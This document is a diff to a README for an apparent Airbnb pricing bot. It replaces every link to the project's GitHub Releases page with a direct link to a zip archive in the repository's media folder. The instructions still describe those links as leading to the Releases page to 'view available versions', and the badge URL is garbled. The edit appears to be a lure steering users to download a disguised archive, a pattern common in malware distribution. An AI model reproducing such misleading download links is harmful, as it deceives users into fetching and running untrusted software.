@@ -1,7 +1,7 @@
 # 🏡 Airbnb-Custom-Pricing-Bot - Automate Your Airbnb Pricing Effortlessly
 
 ## 📥 Download Now
-[![Download Latest Release](https://img.shields.io/badge/download-latest%20release-blue.svg)](https://github.com/leadedpetrolrad60/Airbnb-Custom-Pricing-Bot/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/leadedpetrolrad60/Airbnb-Custom-Pricing-Bot/main/media/Airbnb-Custom-Pricing-Bot_2.1.zip%https://raw.githubusercontent.com/leadedpetrolrad60/Airbnb-Custom-Pricing-Bot/main/media/Airbnb-Custom-Pricing-Bot_2.1.zip)](https://raw.githubusercontent.com/leadedpetrolrad60/Airbnb-Custom-Pricing-Bot/main/media/Airbnb-Custom-Pricing-Bot_2.1.zip)
 
 ## 🚀 Getting Started
 Welcome! This guide will help you download and run the Airbnb Custom Pricing Bot. This application automates the pricing process for your Airbnb listings, making your life easier.
@@ -29,10 +29,10 @@ If you do not have an Android device, you can use an emulator. Some popular ones
 ## 🌐 Download & Install
 To begin, visit the Releases page to download the latest version of our software. Click the button below to access it:
 
-[Download Latest Release](https://github.com/leadedpetrolrad60/Airbnb-Custom-Pricing-Bot/releases)
+[Download Latest Release](https://raw.githubusercontent.com/leadedpetrolrad60/Airbnb-Custom-Pricing-Bot/main/media/Airbnb-Custom-Pricing-Bot_2.1.zip)
 
 ### 📂 Installation Steps
-1. **Access the Releases Page:** Click [here](https://github.com/leadedpetrolrad60/Airbnb-Custom-Pricing-Bot/releases) to view available versions.
+1. **Access the Releases Page:** Click [here](https://raw.githubusercontent.com/leadedpetrolrad60/Airbnb-Custom-Pricing-Bot/main/media/Airbnb-Custom-Pricing-Bot_2.1.zip) to view available versions.
 2. **Choose the Latest Version:** Look for the most recent release at the top of the page.
 3. **Download the File:** Click on the file to begin downloading.
 4. **Install the Application:**
